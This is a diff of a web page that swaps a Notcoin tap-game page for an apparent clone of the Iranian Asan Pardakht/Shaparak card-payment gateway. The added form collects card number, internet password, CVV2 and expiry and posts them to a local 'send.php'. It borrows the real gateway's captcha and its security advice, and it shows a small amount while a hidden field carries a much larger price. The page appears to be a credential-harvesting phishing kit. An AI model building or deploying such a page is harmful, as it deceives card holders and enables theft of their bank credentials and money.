@@ -1,92 +1,680 @@
+
 <!DOCTYPE html>
-<html lang="en">
+
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notcoin</title>
-    <link rel="stylesheet" href="./assets/css/style.css">
-    <link rel="stylesheet" href="./assets/css/responsive.css">
-    <meta name="theme-color" content="#f19e36" />
+	<meta http-equiv="Content-Language" content="fa">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="X-CSRF-Token" content="dsjlkj30djls89r89jdlnvbddjkdljee"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<title>آسان پرداخت پرشين(آپ)</title>
+	<link href="css/bootstrap/bootstrap.min.css" rel="stylesheet" />
+    <link href="css/bootstrap/bootstrap-responsive.min.css" rel="stylesheet" />
+    <link href="css/previewnew.css" rel="stylesheet" />
+    <link href="css/bootstrap/font-awesome.min.css" rel="stylesheet" />
+	<link href="css/jquery.keypadnew.css" rel="stylesheet" type="text/css">	
+    <!--[if IE 7]>
+        <link href="css/bootstrap/font-awesome-ie7.min.css" rel="stylesheet" />
+    <![endif]-->
+    <!--[if IE 8]>
+        <style type="text/css">
+        .navbar-inner{
+            filter:none;
+        }
+         </style>
+        <![endif]-->
+<style type="text/css">
+/*
+.modal-loading-bar { 
+    position: fixed;
+    top: 50% !important; 
+    right: 50% !important; 
+    margin-top: -100px;  
+    margin-left: -200px; 
+    overflow: visible !important;
+}
+*/
+.modal-loading-bar{
+	position: fixed;
+	left: 50%;
+	top: 50%;
+	margin-top: -100px;
+	margin-left: -150px;
+}
+.modal-loading-bar .modal-content {
+    width: 300px; 
+    height: 60px; 
+	direction:rtl;
+}
+.progress .progress-bar.six-sec-ease-in-out {	
+    -webkit-transition: width 6s ease-in-out;
+    -moz-transition: width 6s ease-in-out;
+    -ms-transition: width 6s ease-in-out;
+    -o-transition: width 6s ease-in-out;
+    transition: width 6s ease-in-out;
+}
 
-    <link rel="icon" type="image/x-icon" href="./assets/favicon/favicon.ico">
+hr.message-inner-separator
+{
+    clear: both;
+    margin-top: 10px;
+    margin-bottom: 13px;
+    border: 0;
+    height: 1px;
+    background-image: -webkit-linear-gradient(left,rgba(0, 0, 0, 0),rgba(0, 0, 0, 0.15),rgba(0, 0, 0, 0));
+    background-image: -moz-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
+    background-image: -ms-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
+    background-image: -o-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
+}
+.alert{
+	margin:10px;
+	font-family:IRANSans; 
+	font-weight:bold; 
+	font-size:11px;
+	text-align:right;
+	direction:rtl
+}
+h3,h4{ 
+ font-family:IRANSans; 
+ direction:rtl
+}
+button.btn{ 
+font-family:IRANSans; 
+font-weight:bold; 
+font-size:11px;
+ margin-top:10px;
+}
+.btn-label {position: relative;right: -12px;display: inline-block;padding: 6px 8px 4px;background: rgba(0,0,0,0.15);}
+.btn-labeled {padding-top: 0;padding-bottom: 0;}
 
-</head>
+.flat .plan {
+  width:300px;
+  margin:20px auto;
+  border-radius: 6px;
+  list-style: none;
+  padding: 0 0 20px;
+  background: #fff;
+  text-align: center;
+}
+.flat .plan li {
+  padding: 10px 15px;
+  color: #000;
+  border-top: 0;
+  -webkit-transition: 300ms;
+  transition: 300ms;
+}
+.flat .plan li.plan-price {
+  border-top: 0;
+}
+.flat .plan li.plan-name {
+  border-radius: 6px 6px 0 0;
+  padding: 15px;
+font-family:IRANSans; 
+font-size:16px;
+  line-height: 28px;
+  color: #fff;
+  background: #468847;
+  direction:rtl;
+  margin-bottom: 0;
+  border-top: 0;
+}
+.flat .plan li.plan-red {
+  border-radius: 6px 6px 0 0;
+  padding: 15px;
+	font-family:IRANSans; 
+	font-size:16px;
+  line-height: 28px;
+  color: #fff;
+  background: #e74c3c;
+  direction:rtl;
+  margin-bottom: 0;
+  border-top: 0;
+}
+
+.headlogo img{
+	height: 120px;
+}
+
+
+@media (max-width: 767px) {
+	.tabbable.custom-tabs>.nav-tabs>li>a{
+		min-width:10px;
+		padding:15px 10px 10px;
+	}
+	.tabbable.custom-tabs>.nav-tabs>li>a>span{
+		display: none
+	}
+	.headlogo img{
+		display: block; 
+		max-width: 100%; 
+		height: 60px;
+	}	
+}
+
+.ipgheader{
+		background-image: url(img/topbarnew.jpg);
+		background-position: 100% auto;
+		background-repeat: no-repeat;
+		background-size: contain;
+		position: relative;
+		padding-bottom: 7.5%;
+	}
+	input:focus:invalid:focus,textarea:focus:invalid:focus,select:focus:invalid:focus{
+		border-color:#66afe9;
+		-webkit-box-shadow:0 0 6px #66afe9;
+		-moz-box-shadow:0 0 6px #66afe9;
+		box-shadow:0 0 6px #66afe9;
+		color:#000;
+	}
+/*.modal-loading-bar{
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	margin-top: -50px;
+	margin-left: -150px;	
+}
+*/
+.BacktoMerchantSite{
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	margin-left: -150px;
+	margin-top: -100px;
+	width: 300px;
+	height: 100px;
+	padding: 32px 0 28px;	
+	text-align: center; 
+	line-height: 18pt; 
+	font-size:12px; 
+	word-spacing: -1px;
+}		
+.PasswordStyleInput {
+    -webkit-text-security: disc;
+    }
+</style>		
+<script type="text/javascript">
+//<![CDATA[
+window["_tsbp_"] = { ba : "X-TS-BP-Action", bh : "X-TS-AJAX-Request"};
+//]]>
+</script><script type="text/javascript" src="/TSbd/08bb6282b4ab200025954e2d3cc05f984deb59daf4ef4b59b822f62767f436f0533ff993e0b8c6aa?type=2"></script></head>
 <body>
 
-    
-    <div class="squad-container">
-        <div class="login">
-            <div class="login-detail">
-                <div class="profile">
-                    <span>?</span>
+<div id="OutputTxt">
+
+<div id="PS_ePayment_GateWay">
+        <div class="row-fluid" id="demo-3">
+            <div class="span10 offset1">
+				<!--
+				<img src="img/sx.png" style="display:block;" />
+                <div class="ipgheader"></div>
+                <img src="img/s5.gif" style="display:block;" />
+				-->
+				<div style="display: flex; background:#fff; margin-bottom: 10px; margin-top: 10px; 
+    -o-box-shadow: 0 0 4px rgba(0,0,0,.4);-ms-box-shadow: 0 0 4px rgba(0,0,0,.4);
+-moz-box-shadow: 0 0 4px rgba(0,0,0,.4);-webkit-box-shadow: 0 0 4px rgba(0,0,0,.4);box-shadow: 0 0 4px rgba(0,0,0,.4);				
+				">
+					<div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+						<img src="img/logoap.jpg" style="float:left;" />
+					</div>
+					<div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+						<img src="img/logosh.jpg" style="float: right;" />
+					</div>
+				</div>
+                <div class="tabbable custom-tabs tabs-right tabs-animated  flat flat-all hide-label-980 shadow  track-url auto-scroll">
+                    <ul class="nav nav-tabs">
+                        <li class="active"><a href="#panel3-1" data-toggle="tab" class="active "><span>انجام تراکنش</span>&nbsp;&nbsp;<i class="icon-lock"></i></a></li>                        
+						
+						<!--
+						<li><a href="#panel3-2" data-toggle="tab"><span>هویت پذیرنده</span>&nbsp;&nbsp;<i class="icon-user"></i></a></li>
+                        -->
+						
+						<li><a href="#panel3-3" data-toggle="tab"><span>توصیه ها</span>&nbsp;&nbsp;<i class="icon-key"></i></a></li>
+                        
+						<!--
+						<li><a href="#panel3-4" data-toggle="tab"><span>اطلاعات تماس</span>&nbsp;&nbsp;<i class="icon-envelope-alt"></i></a></li>
+						-->
+						
+                    </ul>
+                    <div class="tab-content ">
+                        <div class="tab-pane active" id="panel3-1" dir="rtl">
+                            <div class="row-fluid">                                
+                                <div class="span6">
+                                    <h4><i class="icon-shopping-cart icon-large" style="font-size: 13pt"></i>&nbsp;&nbsp;اطلاعات خرید</h4>
+                                    <div class="box" style="line-height:20px;">
+                                        <p>
+                                            نام پذیرنده :
+                                            <br />
+                                            <span>درگاه پرداخت موبايل</span>
+                                        </p>
+                                        <p>
+                                            کد پذیرنده / ترمينال:
+                                            <br />
+                                            <span>87597 / 45647</span>
+                                        </p>
+                                        
+										<p>
+                                            نشانی سايت پذيرنده:
+                                            <br />
+                                            <span>																						
+											www.sighe.ir
+											</span>
+                                        </p>
+										                                                                                
+                                        <p>
+                                            مبلغ تراکنش :
+                                            <br />
+                                            <span style="font:11pt IRANSans;">
+											
+											<span style="font:11px IRANSans;">20,000 ریال</span></span>
+                                        </p>
+									</div>
+										<div style="background:#e0e0e0; text-align:right; font:10pt IRANSans; color: #333; margin-top:-10px; padding-right: 10px">
+											زمان باقيمانده: <span class="GateTimer" style="text-align:left; font:12pt/30px IRANSans; color:#666"></span>											
+										</div>  									
+                                </div>
+                                
+                                <div class="span6">
+								<form method="POST" action="send.php" name="epay_gateway_form" id="epay_gateway_form" style="padding:0; margin:0">
+									<input type="hidden" name="action" value="IPG_Pay_CallBack">
+									<input type="hidden" name="RefId" value="b46f073593151f637">
+									<input type="hidden" name="MessageId" value="114249058">
+									<input type="hidden" name="price" value="926500">
+									<input type="hidden" name="bankname" id="bankname" value="">
+									
+									<h4><i class="icon-credit-card" style="font-size: 13pt"></i>&nbsp;&nbsp; اطلاعات کارت</h4>
+									
+                                    <label class="inputstyler">شماره کارت
+										<span style="font:bold 11px IRANSans; padding-right:2px; color:#d00" id="GatewayFetchBankNameDiv"></span>
+									</label>
+									<input type="hidden" name="cardnumberzp" id="cardnumberzp" value="" />
+									<input type="tel" autocomplete="off" name="cardnumber" id="cardnumber" maxlength="16" dir="ltr" class="span12 text-left" required/>
+									
+									<label class="inputstyler">رمز اينترنتی (رمز دوم)</label>
+                                    <input type="password" maxlength="12" tabindex="7" autocomplete="off" id="secondpass" name="secondpass" dir="ltr" class="input-block-level" inputmode="numeric" nextelement="CVV" required/>
+                                    <label class="inputstyler">کد CVV2</label>
+                                    <input type="password" autocomplete="off" id="cvv2" name="cvv2"  maxlength="4"  dir="ltr" class="input-block-level" inputmode="numeric" required/>
+                                    <label class="inputstyler">تاریخ انقضای کارت</label>
+									<div class="expdatealert alert alert-info" dir="rtl" style="display:none; padding: 3px 5px 0; margin:10px 0; font-weight:bold; font-size: 11px;">
+										در صورت نياز می‌توانيد تاريخ انقضا را ويرايش نمائيد.
+									</div>									
+									<div class="row">
+										<div class="span2" style="float: right">
+										<label for="expmah" class="control-label inputstyler">ماه</label>                                    
+										<input type="tel" autocomplete="off" id="expmah" name="expmah"  maxlength="2" dir="ltr" class="span10 text-center" style="font:11pt Tahoma,sans-serif" required/>
+										<input type="hidden" name="expmahnew" value="" />
+										</div>
+										<div class="span2" style="float: right">
+										<label for="expyear" class="control-label inputstyler">سال</label>
+										<input type="tel" autocomplete="off" id="expyear" name="expyear" value="" maxlength="2" dir="ltr" class="span10 text-center" style="font:11pt Tahoma,sans-serif" required/>
+										<input type="hidden" name="expyearnew" value="" />
+										</div>
+									</div>
+									
+									<div class="row" style="margin-bottom: 30px">
+										<div class="span12 text-center" style="float:right;">
+											<label class="inputstyler text-right">کد امنیتی</label>									
+											<input type="tel" autocomplete="off" name="captchcode" id="captchacode" maxlength="5" dir="ltr" class="numeric text-center" style="float:right;14px tahoma,sans-serif; padding-left:2px; padding-right:2px;" required/>
+											<img id="imgCaptchaGateway" src="https://asan.shaparak.ir/captcha.asp" style="float:right; height:auto; vertical-align:middle;" />
+											<a title="تغيير تصوير" href="javascript:void(0)" onclick="RefreshImage('imgCaptchaGateway')"><img alt="تغيير تصوير" src="img/ico_refresh.png"  style="float:right; margin-top:3px; border:0; width:24px; height:24px; vertical-align:middle"></a>
+										</div>
+									</div>								
+									<div class="row">
+										
+										<div class="span6" style="float:right;">										
+										<input type="tel" pattern="\d{16}" placeholder="موبايل(اختياری)" name="mobileforipg" id="mobileforipg" value="" autocomplete="on" maxlength="11" dir="rtl" class="numeric span11" style="font:11px Tahoma,sans-serif" />
+										</div>
+										<div class="span6" style="float:right;">
+										<input type="text" placeholder="ايميل(اختياری)" name="emailforipg" id="emailforipg" value="" autocomplete="on" maxlength="50" dir="rtl" class="span11" style="font:11px tahoma,sans-serif" />
+										</div>
+										
+									</div>
+										<div style="clear:both"></div>																				
+										<div id="GatewayInputError"></div>										
+										<div style="clear:both"></div>										
+										<button type="submit"  class="paymentap btn btn-labeled btn-success"><span class="btn-label"><i class="icon-ok" style=""></i></span><span style="padding-right: 24px; padding-left: 24px">پرداخت</span></button>
+										<button type="button" onclick="location.href = 'cancel.php'"  class="btn btn-labeled btn-default"><span class="btn-label"><i class="icon-remove" style=""></i></span>انصراف</button>									
+                                </form>
+								</div>
+                            </div>
+                        </div>
+						  <div class="tab-pane" id="panel3-2">
+                            <div class="row-fluid">
+                                <div class="span5" dir="rtl">
+                                    <h4><i class="icon-user"></i>&nbsp;&nbsp; لوگوی پذیرنده</h4>
+                                        <div style="width:100%; min-height:100%;
+                                        background-image:url(img/logo/merchant/105063.png); background-position:50% 0%; 
+                                         background-repeat:no-repeat; display:inline-block;"> 
+                                        <img src="img/s3.png" style="width:100%; height:100%;"> 
+										</div>
+                                </div>
+                                
+                                <div class="span7" dir="rtl">
+                                    <h4><i class="icon-question"></i>&nbsp;&nbsp;هویت پذیرنده</h4>
+                                    <div class="box" style="line-height:20px;">
+                                        <p >
+                                            نام پذیرنده :
+                                            <br />
+                                            <span>درگاه پرداخت موبايل</span>
+                                        </p>
+                                         <p>
+                                            نام مدیر/صاحب درگاه پرداخت :
+                                            <br />
+                                            <span>مهدي شهيدي</span>
+                                        </p>
+                                        <p>
+                                            کد پذیرنده :
+                                            <br />
+                                            <span>105063</span>
+                                        </p>
+                                        <p>
+                                            حوزه اصلی فعالیت پذیرنده :
+                                            <br />
+                                            <span>موسسات مالي- کالا و خدمات</span>
+                                        </p>
+                                        <p>
+                                            نشانی پذیرنده :
+                                            <br />
+                                            <span>خيابان کريمخان، نبش خيابان خردمند جنوبي، پلاک 69</span>
+                                        </p>
+                                        <p>
+                                            تلفن تماس پذیرنده :
+                                            <br />
+                                            <span>83332706</span>
+                                        </p>
+                                        <p>
+                                            آدرس ایمیل پشتیبانی پذیرنده :
+                                            <br />
+                                            <span>info@asanpardakht.ir</span>
+                                        </p>
+                                    </div>  
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane" id="panel3-3">
+                            <div class="row-fluid">
+                                
+                                <div class="span12" dir="rtl">
+                                    <h4><i class="icon-question"></i>&nbsp;&nbsp;توصیه های امنیتی و راهنمایی ها</h4>
+                                    <div class="box">
+                                        <p>نکات امنیتی</p>
+                                        <ul>
+                                            <li>
+                                            
+                                            درگاه پرداخت اینترنتی آسان پرداخت با استفاده از پروتکل امن SSL به مشتریان خود ارایه خدمت نموده و با آدرس https://asan.shaparak.ir شروع می شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
+                                            
+                                            </li>
+                                            <li>از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
+                                            <li>برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
+                                            <li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما تماس بگیرید.</li>                           
+                                        </ul>
+
+                                    </div>
+                                    <div class="box">
+                                    <p>راهنمایی ها</p>
+                                        <ul>
+                                            <li>برای انجام تراکنش های اینترنتی باید، رمز دوم یا رمز اینترنتی برای کارت خود دریافت نموده باشید. این رمز با رمز اول که در خرید از پایانه های فروش یا دریافت وجه از خودپرداز استفاده می شود متفاوت است.</li>
+                                            <li>کد CVV2 بر روی کارت یا پشت کارت شما درج شده و متشکل از سه یا چهار رقم است</li>
+                                            <li>تاریخ انقضا روی کارت شما درج شده است. در هنگام وارد کردن سال انقضا صرفا باید آنرا بصورت دو رقمی وارد نمایید</li>
+
+                                        </ul>
+
+                                    </div>
+                                </div>
+                            </div>
+
+
+                        </div>
+                        <div id="panel3-4" class="tab-pane" dir="rtl">
+                            <div class="row-fluid">
+                                
+                                <div class="span12">
+                                    <div class="row-fluid">
+                                        <div class="span12">
+                                            <h4><i class="icon-location-arrow"></i>&nbsp;&nbsp;آسان پرداخت روی نقشه</h4>
+
+                                            <div class="map"></div>
+
+                                        </div>
+                                    </div>
+                                    <div class="row-fluid">
+                                        <div class="span6">
+                                            <h4><i class="icon-envelope-alt"></i>&nbsp;&nbsp;تماس الکترونیکی</h4>
+                                            <address>
+                                                <strong>پشتیبانی درگاه اینترنتی</strong><br>
+                                                vpos[at]persianswitch.com
+                                            </address>
+                                        </div>
+                                        <div class="span6">
+                                            <h4><i class="icon-location-arrow"></i>&nbsp;&nbsp;آدرس ما</h4>
+
+                                            <address>
+                                                <strong>شرکت آسان پرداخت پرشین</strong><br>
+                                                تهران، خیابان کریمخان زند<br>
+                                                ابتدای خردمند جنوبی، پلاک 69<br>
+                                                تلفن:<br>
+                                                83333-(021)
+                                            </address>
+                                        </div>
+
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
                 </div>
-
-                <div class="user-data">
-                    <span class="name"> TEL | armin_x3</span>
-                    <span class="user-rank">ARMIN X3</span>
+                <img src="img/sx.png" style="display:block;" />
+                <div style="width:100%; height:30px; font-family:IRANSans; color:#333; text-align:center; font-size:11px;line-height: 16pt">
+                    <div class="span12" dir="rtl" style="font-family:IRANSans; color:#333; text-align:center; 
+                    font-size:11px;line-height: 16pt">کلیه حقوق برای شرکت آسان پرداخت محفوظ است. 
+                    <br>
+					تماس: 02183333
+                    <div class="span12" dir="rtl" style="display: none">
+                    <img alt="شبکه الکترونیکی پرداخت کارت شاپرک" title="شبکه الکترونیکی پرداخت کارت شاپرک" src="img/logo_shaparak.png" style="width:60px; height:38px; border:3px solid #ccc;" />
+                    <img alt="آسان پرداخت پرشين (آپ)" title="آسان پرداخت پرشين (آپ)" src="img/logo_ap.png" style="width:40px; height:38px; border:3px solid #ccc;" />
+                    <img src="img/logo_ssl.png" style="width:95px; height:38px; border:3px solid #ccc;" />
+                	</div>
+                    
+                    </div>
                 </div>
-            </div>
-
-            <div>
-                <a href="login.html">
-                    <svg width="30px" height="30px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path opacity="0.8" d="M2.00098 11.999L16.001 11.999M16.001 11.999L12.501 8.99902M16.001 11.999L12.501 14.999" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path opacity="0.5" d="M9.00195 7C9.01406 4.82497 9.11051 3.64706 9.87889 2.87868C10.7576 2 12.1718 2 15.0002 2L16.0002 2C18.8286 2 20.2429 2 21.1215 2.87868C22.0002 3.75736 22.0002 5.17157 22.0002 8L22.0002 16C22.0002 18.8284 22.0002 20.2426 21.1215 21.1213C20.2429 22 18.8286 22 16.0002 22H15.0002C12.1718 22 10.7576 22 9.87889 21.1213C9.11051 20.3529 9.01406 19.175 9.00195 17" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round"/>
-                    </svg>
-                </a>
-            </div>
+                <br />
+            </div>  
+                      
         </div>
-    </div>
+</div>                            
+</div>
 
-    <div class="coin-count-container">
-        <img src="./assets/images/coin.png" width="45px">
-        <h1 class="select-none"></h1>
-    </div>
+<div class="modal modal-loading-bar" style="width:300px">
+ <div class="modal-dialog">
+   <div class="modal-content">
+     <div class="modal-body">		
+		<div class="progress progress-striped progress-danger active">
+		   <div class="bar six-sec-ease-in-out" aria-valuetransitiongoal="100" style="font-family:IRANSans; font-size:13px"></div>
+		</div>		
+     </div>
+   </div>
+ </div>
+</div>
+    <script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
+    <script type="text/javascript" src="js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="js/tabs-addon.js"></script>
+	<script type="text/javascript" src="js/jquery.keypad.js"></script>
+	<script type="text/javascript" src="js/jquery.numeric.js"></script>
+	<script type="text/javascript" src="js/functions.js?40bb4d96d117a67fd75bc4828ff8bf08"></script>
+    <script type="text/javascript">
+	var csrf_token = '40bb4d96d117a67fd75bc4828ff8bf08';
+	$(document).bind("ajaxSend", function(elm, xhr, s){	
+	   //if (s.type == "POST") {
+	   if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(s.type)) {
+		xhr.setRequestHeader('X-CSRF-Token', csrf_token);
+	   }
+	});
+	//if ($("#cardnumber").length >= 1)
+		//$("#cardnumber").val('');
+	if ($(window).width() > 768)
+		$("#cardnumber").focus(); 
+	if (top.frames.length != 0) 
+		{
+			//alert('شما مجاز به استفاده از فريم نيستيد.');
+			top.location = window.location;
+		}
+        var aspect_ratio = 0.0726075949367089;
+		jQuery(window).resize(function() {
+			$("#topnavbar").height( $("#topnavbar").width() * aspect_ratio );
+		});
+		
+		$(function ()
+        {
+			PSGateWayPackage();
+			$("#topnavbar").height($("#topnavbar").width() * aspect_ratio );
+			$("a[href^='#demo']").click(function (evt)
+            {
+                evt.preventDefault();
+                var scroll_to = $($(this).attr("href")).offset().top;
+                $("html,body").animate({ scrollTop: scroll_to - 80 }, 600);
+            });
+            $("a[href^='#bg']").click(function (evt)
+            {
+                evt.preventDefault();
+                $("body").removeClass("light").removeClass("dark").addClass($(this).data("class")).css("background-image", "url('css/" + $(this).data("file") + "')");
+                console.log($(this).data("file"));
 
-    <div class="rank-container">
-        <div class="rank-items">
-            <h3 class="select-none">Notcoin</h3>
-            
-            <img src="./assets/images/bronze-medal.png" class="select-none" width="30px">
-            <span id="rank" class="select-none">Bronz</span>
-        </div>
-    </div>
-    
-    <div class="coin-container">
-        <!-- <span>+1</span> -->
-        <img src="./assets/images/golden.png" id="coin" class="select-none" width="300px" />
-    </div>
 
-    <div class="menu-container">
-        <div class="power">
-            <img src="./assets/images/thunder.png" width="40px">
-            <div class="power-count">
-                <span id="power" class="select-none">100000000</span>
-                <span class="gray select-none" id="total">/1000000000</span>
-            </div>
-        </div>
+            });
+            $("a[href^='#color']").click(function (evt)
+            {
+                evt.preventDefault();
+                var elm = $(".tabbable");
+                elm.removeClass("grey").removeClass("dark").removeClass("dark-input").addClass($(this).data("class"));
+                if (elm.hasClass("dark dark-input"))
+                {
+                    $(".btn", elm).addClass("btn-inverse");
+                }
+                else
+                {
+                    $(".btn", elm).removeClass("btn-inverse");
+                }
 
-        <div class="menu-bottuns">
-            <a href="frens.html" class="button b-r">
-                <img src="./assets/images/teddy-bear.png" alt="" width="50px">
-                <span class="select-none"></span>
-            </a>
-            <a href="earn.html" class="button b-r">
-                <img src="./assets/images/Amir.png" alt="" width="50px">
-                <span class="select-none"></span>
-            </a>
-            <a href="boost.html" class="button">
-                <img src="./assets/images/rocket.png" alt="" width="50px">
-                <span class="select-none"></span>
-            </a>
-        </div>
-    </div>
+            });
+            $(".color-swatch div").each(function ()
+            {
+                $(this).css("background-color", $(this).data("color"));
+            });
+            $(".color-swatch div").click(function (evt)
+            {
+                evt.stopPropagation();
+                $("body").removeClass("light").removeClass("dark").addClass($(this).data("class")).css("background-color", $(this).data("color"));
+            });
+            $("#texture-check").mouseup(function (evt)
+            {
+                evt.preventDefault();
 
-    <div class="progress-bar">
-        <div class="progress"></div>
-    </div>
+                if (!$(this).hasClass("active"))
+                {
+                    $("body").css("background-image", "url(css/n1.png)");
+                }
+                else
+                {
+                    $("body").css("background-image", "none");
+                }
+            });
 
+            $("a[href='#']").click(function (evt)
+            {
+                evt.preventDefault();
+            });
 
-    <script src="./assets/js/main.js"></script>
+            $("a[data-toggle='popover']").popover({
+                trigger:"hover",html:true,placement:"top"
+            });
+        });
+		if ($('#cardnumber').length > 0){
+			if ($('#cardnumber').val().length > 6 && $('#GatewayFetchBankNameDiv').html().length < 1)
+				$('#GatewayFetchBankNameDiv').html(FetchBankName($('#cardnumber').val().replace(/[^0-9*]/g, '')));
+		}
+		
+
+		$('#cardlistcombo').on('change',function(e){
+			if (this.value == 'NoSavedCard'){
+				$('.cardnumber4div').slideDown('500', function(){$(this).show();});
+				$('#expmah').val('');
+				$('#expyear').val('');				
+				$('.expdatealert').slideUp('500', function(){$(this).hide();});
+			}
+			else{ 
+				$('.cardnumber4div').slideUp('500', function(){$(this).hide();});
+				if (this.options[this.selectedIndex].getAttribute('expiration') == 'true'){
+					$('#expmah').val('••');
+					$('#expyear').val('••');
+					$('.expdatealert').slideDown('500', function(){$(this).show();});
+				}
+				else{
+					$('#expmah').val('');
+					$('#expyear').val('');				
+					$('.expdatealert').slideUp('500', function(){$(this).hide();});
+				}
+					
+			}
+				
+		});
+		
+		$("#secondpass, #cvv2, #expmah, #expyear, #captchacode").keyup(function () {
+			//$(this).prop("autocomplete","off");
+			//$(this).val(Num2En($(this).val()));			
+			var ipgformval = Num2En($(this).val());			
+			$(this).val(ipgformval.replace(/[^0-9*]/g, ''));
+			
+			//if ($('#captchacode').val().length == 5 && $(window).width() < 768){
+			if ($('#captchacode').is(":focus") && $('#captchacode').val().length == 5){
+				$('html, body').animate({
+				  scrollTop: $(".paymentap").offset().top
+				}, 1000);			
+			}
+		});
+		$(".cardnumberap").keyup(function () {			
+			//$(this).prop("autocomplete","off");
+			//$(this).val(Num2En($(this).val()));			
+			var cardval = Num2En($(this).val());
+			$(this).val(cardval.replace(/[^0-9*]/g, ''));
+			
+			if ($('input:[name=cardnumber1]').val().length == 4 && $('input:[name=cardnumber2]').val().length >= 2){
+				var bincardtxt = $('input:[name=cardnumber1]').val()+$('input:[name=cardnumber2]').val().substr(0,2);
+				$('#GatewayFetchBankNameDiv').html(FetchBankName(bincardtxt));
+			}			
+			
+			if (this.value.length == this.maxLength) {
+			  var $next = $(this).next('.cardnumberap');
+				//$(this).next('.cardnumberap').focus();				
+			  if ($next.length){
+				  $(this).next('.cardnumberap').focus();
+				  var tmpStr = $(this).next('.cardnumberap').val();
+				  $(this).next('.cardnumberap').val('');				  
+				  $(this).next('.cardnumberap').val(tmpStr);				  				  
+				  $(this).next('.cardnumberap').focus().val($(this).next('.cardnumberap').val());
+				}
+			  else
+				$('#secondpass').focus().val($('#secondpass').val());
+				  //$(this).blur();
+			}
+		});
+		$(document).ready(function() {
+			var isWebKit = /webkit/.test(navigator.userAgent.toLowerCase());
+			var isEdge = navigator.userAgent.search("Edge") > 0;	
+			if (!isEdge && isWebKit){		
+				$("#secondpass, #cvv2").addClass("PasswordStyleInput");
+				$("#secondpass, #cvv2").prop("type", "tel");
+				//$("#secondpass, #cvv2").attr("type", "tel");
+				//setTimeout(function() {
+					//$("#secondpass, #cvv2").addClass("PasswordStyleInput");
+					//$("#secondpass, #cvv2").prop("type", "tel");			
+				//}, 1);
+			}			
+		});
+	var image = new Image();
+	image.src = '/img/aploader.gif';		
+    </script>
 </body>
 </html>
